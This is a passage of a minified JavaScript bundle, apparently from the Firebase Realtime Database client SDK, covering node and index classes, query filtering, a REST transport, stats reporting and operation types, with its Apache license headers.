l=n.get(e.name);let a=i;return l&&(a=a.remove(new U(e.name,l))),a.insert(e,e.node)}});return new Ut(r,this.indexSet_)}removeFromIndexes(e,n){const r=Cl(this.indexes_,i=>{if(i===Cr)return i;{const s=n.get(e.name);return s?i.remove(new U(e.name,s)):i}});return new Ut(r,this.indexSet_)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let Di;class A{constructor(e,n,r){this.children_=e,this.priorityNode_=n,this.indexMap_=r,this.lazyHash_=null,this.priorityNode_&&Cy(this.priorityNode_),this.children_.isEmpty()&&S(!this.priorityNode_||this.priorityNode_.isEmpty(),"An empty node cannot have a priority")}static get EMPTY_NODE(){return Di||(Di=new A(new He(ah),null,Ut.Default))}isLeafNode(){return!1}getPriority(){return this.priorityNode_||Di}updatePriority(e){return this.children_.isEmpty()?this:new A(this.children_,e,this.indexMap_)}getImmediateChild(e){if(e===".priority")return this.getPriority();{const n=this.children_.get(e);return n===null?Di:n}}getChild(e){const n=M(e);return n===null?this:this.getImmediateChild(n).getChild(G(e))}hasChild(e){return this.children_.get(e)!==null}updateImmediateChild(e,n){if(S(n,"We should always be passing snapshot nodes"),e===".priority")return this.updatePriority(n);{const r=new U(e,n);let i,s;n.isEmpty()?(i=this.children_.remove(e),s=this.indexMap_.removeFromIndexes(r,this.children_)):(i=this.children_.insert(e,n),s=this.indexMap_.addToIndexes(r,this.children_));const o=i.isEmpty()?Di:this.priorityNode_;return new A(i,o,s)}}updateChild(e,n){const r=M(e);if(r===null)return n;{S(M(e)!==".priority"||Nn(e)===1,".priority must be the last token in a path");const i=this.getImmediateChild(r).updateChild(G(e),n);return this.updateImmediateChild(r,i)}}isEmpty(){return this.children_.isEmpty()}numChildren(){return this.children_.count()}val(e){if(this.isEmpty())return null;const n={};let r=0,i=0,s=!0;if(this.forEachChild(le,(o,l)=>{n[o]=l.val(e),r++,s&&A.INTEGER_REGEXP_.test(o)?i=Math.max(i,Number(o)):s=!1}),!e&&s&&i<2*r){const o=[];for(const l in n)o[l]=n[l];return o}else return e&&!this.getPriority().isEmpty()&&(n[".priority"]=this.getPriority().val()),n}hash(){if(this.lazyHash_===null){let e="";this.getPriority().isEmpty()||(e+="priority:"+Ey(this.getPriority().val())+":"),this.forEachChild(le,(n,r)=>{const i=r.hash();i!==""&&(e+=":"+n+":"+i)}),this.lazyHash_=e===""?"":Kv(e)}return this.lazyHash_}getPredecessorChildName(e,n,r){const i=this.resolveIndex_(r);if(i){const s=i.getPredecessorKey(new U(e,n));return s?s.name:null}else return this.children_.getPredecessorKey(e)}getFirstChildName(e){const n=this.resolveIndex_(e);if(n){const r=n.minKey();return r&&r.name}else return this.children_.minKey()}getFirstChild(e){const n=this.getFirstChildName(e);return n?new U(n,this.children_.get(n)):null}getLastChildName(e){const n=this.resolveIndex_(e);if(n){const r=n.maxKey();return r&&r.name}else return this.children_.maxKey()}getLastChild(e){const n=this.getLastChildName(e);return n?new U(n,this.children_.get(n)):null}forEachChild(e,n){const r=this.resolveIndex_(e);return r?r.inorderTraversal(i=>n(i.name,i.node)):this.children_.inorderTraversal(n)}getIterator(e){return this.getIteratorFrom(e.minPost(),e)}getIteratorFrom(e,n){const r=this.resolveIndex_(n);if(r)return r.getIteratorFrom(e,i=>i);{const i=this.children_.getIteratorFrom(e.name,U.Wrap);let s=i.peek();for(;s!=null&&n.compare(s,e)<0;)i.getNext(),s=i.peek();return i}}getReverseIterator(e){return this.getReverseIteratorFrom(e.maxPost(),e)}getReverseIteratorFrom(e,n){const r=this.resolveIndex_(n);if(r)return r.getReverseIteratorFrom(e,i=>i);{const i=this.children_.getReverseIteratorFrom(e.name,U.Wrap);let s=i.peek();for(;s!=null&&n.compare(s,e)>0;)i.getNext(),s=i.peek();return i}}compareTo(e){return this.isEmpty()?e.isEmpty()?0:-1:e.isLeafNode()||e.isEmpty()?1:e===Zs?-1:0}withIndex(e){if(e===Qr||this.indexMap_.hasIndex(e))return this;{const n=this.indexMap_.addIndex(e,this.children_);return new A(this.children_,this.priorityNode_,n)}}isIndexed(e){return e===Qr||this.indexMap_.hasIndex(e)}equals(e){if(e===this)return!0;if(e.isLeafNode())return!1;{const n=e;if(this.getPriority().equals(n.getPriority()))if(this.children_.count()===n.children_.count()){const r=this.getIterator(le),i=n.getIterator(le);let s=r.getNext(),o=i.getNext();for(;s&&o;){if(s.name!==o.name||!s.node.equals(o.node))return!1;s=r.getNext(),o=i.getNext()}return s===null&&o===null}else return!1;else return!1}}resolveIndex_(e){return e===Qr?null:this.indexMap_.get(e.toString())}}A.INTEGER_REGEXP_=/^(0|[1-9]\d*)$/;class ZR extends A{constructor(){super(new He(ah),A.EMPTY_NODE,Ut.Default)}compareTo(e){return e===this?0:1}equals(e){return e===this}getPriority(){return this}getImmediateChild(e){return A.EMPTY_NODE}isEmpty(){return!1}}const Zs=new ZR;Object.defineProperties(U,{MIN:{value:new U(ai,A.EMPTY_NODE)},MAX:{value:new U(ar,Zs)}});wy.__EMPTY_NODE=A.EMPTY_NODE;ge.__childrenNodeConstructor=A;GR(Zs);YR(Zs);/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const e1=!0;function Ce(t,e=null){if(t===null)return A.EMPTY_NODE;if(typeof t=="object"&&".priority"in t&&(e=t[".priority"]),S(e===null||typeof e=="string"||typeof e=="number"||typeof e=="object"&&".sv"in e,"Invalid priority type found: "+typeof e),typeof t=="object"&&".value"in t&&t[".value"]!==null&&(t=t[".value"]),typeof t!="object"||".sv"in t){const n=t;return new ge(n,Ce(e))}if(!(t instanceof Array)&&e1){const n=[];let r=!1;if(Ge(t,(o,l)=>{if(o.substring(0,1)!=="."){const a=Ce(l);a.isEmpty()||(r=r||!a.getPriority().isEmpty(),n.push(new U(o,a)))}}),n.length===0)return A.EMPTY_NODE;const s=bl(n,qR,o=>o.name,ah);if(r){const o=bl(n,le.getCompare());return new A(s,Ce(e),new Ut({".priority":o},{".priority":le}))}else return new A(s,Ce(e),Ut.Default)}else{let n=A.EMPTY_NODE;return Ge(t,(r,i)=>{if(Qt(t,r)&&r.substring(0,1)!=="."){const s=Ce(i);(s.isLeafNode()||!s.isEmpty())&&(n=n.updateImmediateChild(r,s))}}),n.updatePriority(Ce(e))}}KR(Ce);/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class t1 extends ga{constructor(e){super(),this.indexPath_=e,S(!j(e)&&M(e)!==".priority","Can't create PathIndex with empty path or .priority key")}extractChild(e){return e.getChild(this.indexPath_)}isDefinedOn(e){return!e.getChild(this.indexPath_).isEmpty()}compare(e,n){const r=this.extractChild(e.node),i=this.extractChild(n.node),s=r.compareTo(i);return s===0?yi(e.name,n.name):s}makePost(e,n){const r=Ce(e),i=A.EMPTY_NODE.updateChild(this.indexPath_,r);return new U(n,i)}maxPost(){const e=A.EMPTY_NODE.updateChild(this.indexPath_,Zs);return new U(ar,e)}toString(){return _y(this.indexPath_,0).join("/")}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class n1 extends ga{compare(e,n){const r=e.node.compareTo(n.node);return r===0?yi(e.name,n.name):r}isDefinedOn(e){return!0}indexedValueChanged(e,n){return!e.equals(n)}minPost(){return U.MIN}maxPost(){return U.MAX}makePost(e,n){const r=Ce(e);return new U(n,r)}toString(){return".value"}}const r1=new n1;/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Iy(t){return{type:"value",snapshotNode:t}}function ui(t,e){return{type:"child_added",snapshotNode:e,childName:t}}function As(t,e){return{type:"child_removed",snapshotNode:e,childName:t}}function Os(t,e,n){return{type:"child_changed",snapshotNode:e,childName:t,oldSnap:n}}function i1(t,e){return{type:"child_moved",snapshotNode:e,childName:t}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class uh{constructor(e){this.index_=e}updateChild(e,n,r,i,s,o){S(e.isIndexed(this.index_),"A node must be indexed if only a child is updated");const l=e.getImmediateChild(n);return l.getChild(i).equals(r.getChild(i))&&l.isEmpty()===r.isEmpty()||(o!=null&&(r.isEmpty()?e.hasChild(n)?o.trackChildChange(As(n,l)):S(e.isLeafNode(),"A child remove without an old child only makes sense on a leaf node"):l.isEmpty()?o.trackChildChange(ui(n,r)):o.trackChildChange(Os(n,r,l))),e.isLeafNode()&&r.isEmpty())?e:e.updateImmediateChild(n,r).withIndex(this.index_)}updateFullNode(e,n,r){return r!=null&&(e.isLeafNode()||e.forEachChild(le,(i,s)=>{n.hasChild(i)||r.trackChildChange(As(i,s))}),n.isLeafNode()||n.forEachChild(le,(i,s)=>{if(e.hasChild(i)){const o=e.getImmediateChild(i);o.equals(s)||r.trackChildChange(Os(i,s,o))}else r.trackChildChange(ui(i,s))})),n.withIndex(this.index_)}updatePriority(e,n){return e.isEmpty()?A.EMPTY_NODE:e.updatePriority(n)}filtersNodes(){return!1}getIndexedFilter(){return this}getIndex(){return this.index_}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class bs{constructor(e){this.indexedFilter_=new uh(e.getIndex()),this.index_=e.getIndex(),this.startPost_=bs.getStartPost_(e),this.endPost_=bs.getEndPost_(e),this.startIsInclusive_=!e.startAfterSet_,this.endIsInclusive_=!e.endBeforeSet_}getStartPost(){return this.startPost_}getEndPost(){return this.endPost_}matches(e){const n=this.startIsInclusive_?this.index_.compare(this.getStartPost(),e)<=0:this.index_.compare(this.getStartPost(),e)<0,r=this.endIsInclusive_?this.index_.compare(e,this.getEndPost())<=0:this.index_.compare(e,this.getEndPost())<0;return n&&r}updateChild(e,n,r,i,s,o){return this.matches(new U(n,r))||(r=A.EMPTY_NODE),this.indexedFilter_.updateChild(e,n,r,i,s,o)}updateFullNode(e,n,r){n.isLeafNode()&&(n=A.EMPTY_NODE);let i=n.withIndex(this.index_);i=i.updatePriority(A.EMPTY_NODE);const s=this;return n.forEachChild(le,(o,l)=>{s.matches(new U(o,l))||(i=i.updateImmediateChild(o,A.EMPTY_NODE))}),this.indexedFilter_.updateFullNode(e,i,r)}updatePriority(e,n){return e}filtersNodes(){return!0}getIndexedFilter(){return this.indexedFilter_}getIndex(){return this.index_}static getStartPost_(e){if(e.hasStart()){const n=e.getIndexStartName();return e.getIndex().makePost(e.getIndexStartValue(),n)}else return e.getIndex().minPost()}static getEndPost_(e){if(e.hasEnd()){const n=e.getIndexEndName();return e.getIndex().makePost(e.getIndexEndValue(),n)}else return e.getIndex().maxPost()}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class s1{constructor(e){this.withinDirectionalStart=n=>this.reverse_?this.withinEndPost(n):this.withinStartPost(n),this.withinDirectionalEnd=n=>this.reverse_?this.withinStartPost(n):this.withinEndPost(n),this.withinStartPost=n=>{const r=this.index_.compare(this.rangedFilter_.getStartPost(),n);return this.startIsInclusive_?r<=0:r<0},this.withinEndPost=n=>{const r=this.index_.compare(n,this.rangedFilter_.getEndPost());return this.endIsInclusive_?r<=0:r<0},this.rangedFilter_=new bs(e),this.index_=e.getIndex(),this.limit_=e.getLimit(),this.reverse_=!e.isViewFromLeft(),this.startIsInclusive_=!e.startAfterSet_,this.endIsInclusive_=!e.endBeforeSet_}updateChild(e,n,r,i,s,o){return this.rangedFilter_.matches(new U(n,r))||(r=A.EMPTY_NODE),e.getImmediateChild(n).equals(r)?e:e.numChildren()<this.limit_?this.rangedFilter_.getIndexedFilter().updateChild(e,n,r,i,s,o):this.fullLimitUpdateChild_(e,n,r,s,o)}updateFullNode(e,n,r){let i;if(n.isLeafNode()||n.isEmpty())i=A.EMPTY_NODE.withIndex(this.index_);else if(this.limit_*2<n.numChildren()&&n.isIndexed(this.index_)){i=A.EMPTY_NODE.withIndex(this.index_);let s;this.reverse_?s=n.getReverseIteratorFrom(this.rangedFilter_.getEndPost(),this.index_):s=n.getIteratorFrom(this.rangedFilter_.getStartPost(),this.index_);let o=0;for(;s.hasNext()&&o<this.limit_;){const l=s.getNext();if(this.withinDirectionalStart(l))if(this.withinDirectionalEnd(l))i=i.updateImmediateChild(l.name,l.node),o++;else break;else continue}}else{i=n.withIndex(this.index_),i=i.updatePriority(A.EMPTY_NODE);let s;this.reverse_?s=i.getReverseIterator(this.index_):s=i.getIterator(this.index_);let o=0;for(;s.hasNext();){const l=s.getNext();o<this.limit_&&this.withinDirectionalStart(l)&&this.withinDirectionalEnd(l)?o++:i=i.updateImmediateChild(l.name,A.EMPTY_NODE)}}return this.rangedFilter_.getIndexedFilter().updateFullNode(e,i,r)}updatePriority(e,n){return e}filtersNodes(){return!0}getIndexedFilter(){return this.rangedFilter_.getIndexedFilter()}getIndex(){return this.index_}fullLimitUpdateChild_(e,n,r,i,s){let o;if(this.reverse_){const d=this.index_.getCompare();o=(h,m)=>d(m,h)}else o=this.index_.getCompare();const l=e;S(l.numChildren()===this.limit_,"");const a=new U(n,r),u=this.reverse_?l.getFirstChild(this.index_):l.getLastChild(this.index_),c=this.rangedFilter_.matches(a);if(l.hasChild(n)){const d=l.getImmediateChild(n);let h=i.getChildAfterChild(this.index_,u,this.reverse_);for(;h!=null&&(h.name===n||l.hasChild(h.name));)h=i.getChildAfterChild(this.index_,h,this.reverse_);const m=h==null?1:o(h,a);if(c&&!r.isEmpty()&&m>=0)return s!=null&&s.trackChildChange(Os(n,r,d)),l.updateImmediateChild(n,r);{s!=null&&s.trackChildChange(As(n,d));const v=l.updateImmediateChild(n,A.EMPTY_NODE);return h!=null&&this.rangedFilter_.matches(h)?(s!=null&&s.trackChildChange(ui(h.name,h.node)),v.updateImmediateChild(h.name,h.node)):v}}else return r.isEmpty()?e:c&&o(u,a)>=0?(s!=null&&(s.trackChildChange(As(u.name,u.node)),s.trackChildChange(ui(n,r))),l.updateImmediateChild(n,r).updateImmediateChild(u.name,A.EMPTY_NODE)):e}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class ch{constructor(){this.limitSet_=!1,this.startSet_=!1,this.startNameSet_=!1,this.startAfterSet_=!1,this.endSet_=!1,this.endNameSet_=!1,this.endBeforeSet_=!1,this.limit_=0,this.viewFrom_="",this.indexStartValue_=null,this.indexStartName_="",this.indexEndValue_=null,this.indexEndName_="",this.index_=le}hasStart(){return this.startSet_}isViewFromLeft(){return this.viewFrom_===""?this.startSet_:this.viewFrom_==="l"}getIndexStartValue(){return S(this.startSet_,"Only valid if start has been set"),this.indexStartValue_}getIndexStartName(){return S(this.startSet_,"Only valid if start has been set"),this.startNameSet_?this.indexStartName_:ai}hasEnd(){return this.endSet_}getIndexEndValue(){return S(this.endSet_,"Only valid if end has been set"),this.indexEndValue_}getIndexEndName(){return S(this.endSet_,"Only valid if end has been set"),this.endNameSet_?this.indexEndName_:ar}hasLimit(){return this.limitSet_}hasAnchoredLimit(){return this.limitSet_&&this.viewFrom_!==""}getLimit(){return S(this.limitSet_,"Only valid if limit has been set"),this.limit_}getIndex(){return this.index_}loadsAllData(){return!(this.startSet_||this.endSet_||this.limitSet_)}isDefault(){return this.loadsAllData()&&this.index_===le}copy(){const e=new ch;return e.limitSet_=this.limitSet_,e.limit_=this.limit_,e.startSet_=this.startSet_,e.startAfterSet_=this.startAfterSet_,e.indexStartValue_=this.indexStartValue_,e.startNameSet_=this.startNameSet_,e.indexStartName_=this.indexStartName_,e.endSet_=this.endSet_,e.endBeforeSet_=this.endBeforeSet_,e.indexEndValue_=this.indexEndValue_,e.endNameSet_=this.endNameSet_,e.indexEndName_=this.indexEndName_,e.index_=this.index_,e.viewFrom_=this.viewFrom_,e}}function o1(t){return t.loadsAllData()?new uh(t.getIndex()):t.hasLimit()?new s1(t):new bs(t)}function Qp(t){const e={};if(t.isDefault())return e;let n;if(t.index_===le?n="$priority":t.index_===r1?n="$value":t.index_===Qr?n="$key":(S(t.index_ instanceof t1,"Unrecognized index type!"),n=t.index_.toString()),e.orderBy=ye(n),t.startSet_){const r=t.startAfterSet_?"startAfter":"startAt";e[r]=ye(t.indexStartValue_),t.startNameSet_&&(e[r]+=","+ye(t.indexStartName_))}if(t.endSet_){const r=t.endBeforeSet_?"endBefore":"endAt";e[r]=ye(t.indexEndValue_),t.endNameSet_&&(e[r]+=","+ye(t.indexEndName_))}return t.limitSet_&&(t.isViewFromLeft()?e.limitToFirst=t.limit_:e.limitToLast=t.limit_),e}function Xp(t){const e={};if(t.startSet_&&(e.sp=t.indexStartValue_,t.startNameSet_&&(e.sn=t.indexStartName_),e.sin=!t.startAfterSet_),t.endSet_&&(e.ep=t.indexEndValue_,t.endNameSet_&&(e.en=t.indexEndName_),e.ein=!t.endBeforeSet_),t.limitSet_){e.l=t.limit_;let n=t.viewFrom_;n===""&&(t.isViewFromLeft()?n="l":n="r"),e.vf=n}return t.index_!==le&&(e.i=t.index_.toString()),e}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Ll extends py{constructor(e,n,r,i){super(),this.repoInfo_=e,this.onDataUpdate_=n,this.authTokenProvider_=r,this.appCheckTokenProvider_=i,this.log_=Js("p:rest:"),this.listens_={}}reportStats(e){throw new Error("Method not implemented.")}static getListenId_(e,n){return n!==void 0?"tag$"+n:(S(e._queryParams.isDefault(),"should have a tag if it's not a default query."),e._path.toString())}listen(e,n,r,i){const s=e._path.toString();this.log_("Listen called for "+s+" "+e._queryIdentifier);const o=Ll.getListenId_(e,r),l={};this.listens_[o]=l;const a=Qp(e._queryParams);this.restRequest_(s+".json",a,(u,c)=>{let d=c;if(u===404&&(d=null,u=null),u===null&&this.onDataUpdate_(s,d,!1,r),li(this.listens_,o)===l){let h;u?u===401?h="permission_denied":h="rest_error:"+u:h="ok",i(h,null)}})}unlisten(e,n){const r=Ll.getListenId_(e,n);delete this.listens_[r]}get(e){const n=Qp(e._queryParams),r=e._path.toString(),i=new ca;return this.restRequest_(r+".json",n,(s,o)=>{let l=o;s===404&&(l=null,s=null),s===null?(this.onDataUpdate_(r,l,!1,null),i.resolve(l)):i.reject(new Error(l))}),i.promise}refreshAuthToken(e){}restRequest_(e,n={},r){return n.format="export",Promise.all([this.authTokenProvider_.getToken(!1),this.appCheckTokenProvider_.getToken(!1)]).then(([i,s])=>{i&&i.accessToken&&(n.auth=i.accessToken),s&&s.token&&(n.ac=s.token);const o=(this.repoInfo_.secure?"https://":"http://")+this.repoInfo_.host+e+"?ns="+this.repoInfo_.namespace+_i(n);this.log_("Sending REST request for "+o);const l=new XMLHttpRequest;l.onreadystatechange=()=>{if(r&&l.readyState===4){this.log_("REST Response for "+o+" received. status:",l.status,"response:",l.responseText);let a=null;if(l.status>=200&&l.status<300){try{a=Is(l.responseText)}catch{qe("Failed to parse JSON response for "+o+": "+l.responseText)}r(null,a)}else l.status!==401&&l.status!==404&&qe("Got unsuccessful REST response for "+o+" Status: "+l.status),r(l.status);r=null}},l.open("GET",o,!0),l.send()})}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class l1{constructor(){this.rootNode_=A.EMPTY_NODE}getNode(e){return this.rootNode_.getChild(e)}updateSnapshot(e,n){this.rootNode_=this.rootNode_.updateChild(e,n)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Dl(){return{value:null,children:new Map}}function ky(t,e,n){if(j(e))t.value=n,t.children.clear();else if(t.value!==null)t.value=t.value.updateChild(e,n);else{const r=M(e);t.children.has(r)||t.children.set(r,Dl());const i=t.children.get(r);e=G(e),ky(i,e,n)}}function Nc(t,e,n){t.value!==null?n(e,t.value):a1(t,(r,i)=>{const s=new q(e.toString()+"/"+r);Nc(i,s,n)})}function a1(t,e){t.children.forEach((n,r)=>{e(r,n)})}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class u1{constructor(e){this.collection_=e,this.last_=null}get(){const e=this.collection_.get(),n=Object.assign({},e);return this.last_&&Ge(this.last_,(r,i)=>{n[r]=n[r]-i}),this.last_=e,n}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Jp=10*1e3,c1=30*1e3,d1=5*60*1e3;class h1{constructor(e,n){this.server_=n,this.statsToReport_={},this.statsListener_=new u1(e);const r=Jp+(c1-Jp)*Math.random();ns(this.reportStats_.bind(this),Math.floor(r))}reportStats_(){const e=this.statsListener_.get(),n={};let r=!1;Ge(e,(i,s)=>{s>0&&Qt(this.statsToReport_,i)&&(n[i]=s,r=!0)}),r&&this.server_.reportStats(n),ns(this.reportStats_.bind(this),Math.floor(Math.random()*2*d1))}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */var pt;(function(t){t[t.OVERWRITE=0]="OVERWRITE",t[t.MERGE=1]="MERGE",t[t.ACK_USER_WRITE=2]="ACK_USER_WRITE",t[t.LISTEN_COMPLETE=3]="LISTEN_COMPLETE"})(pt||(pt={}));function Ry(){return{fromUser:!0,fromServer:!1,queryId:null,tagged:!1}}function dh(){return{fromUser:!1,fromServer:!0,queryId:null,tagged:!1}}function hh(t){return{fromUser:!1,fromServer:!0,queryId:t,tagged:!0}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Ml{constructor(e,n,r){this.path=e,this.affectedTree=n,this.revert=r,this.type=pt.ACK_USER_WRITE,this.source=Ry()}operationForChild(e){if(j(this.path)){if(this.affectedTree.value!=null)return S(this.affectedTree.children.isEmpty(),"affectedTree should not have overlapping affected paths."),this;{const n=this.affectedTree.subtree(new q(e));return new Ml(H(),n,this.revert)}}else return S(M(this.path)===e,"operationForChild called for unrelated child."),new Ml(G(this.path),this.affectedTree,this.revert)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Ls{constructor(e,n){this.source=e,this.path=n,this.type=pt.LISTEN_COMPLETE}operationForChild(e){return j(this.path)?new Ls(this.source,H()):new Ls(this.source,G(this.path))}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class ur{constructor(e,n,r){this.source=e,this.path=n,this.snap=r,this.type=pt.OVERWRITE}operationForChild(e){return j(this.path)?new ur(this.source,H(),this.snap.getImmediateChild(e)):new ur(this.source,G(this.path),this.snap)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
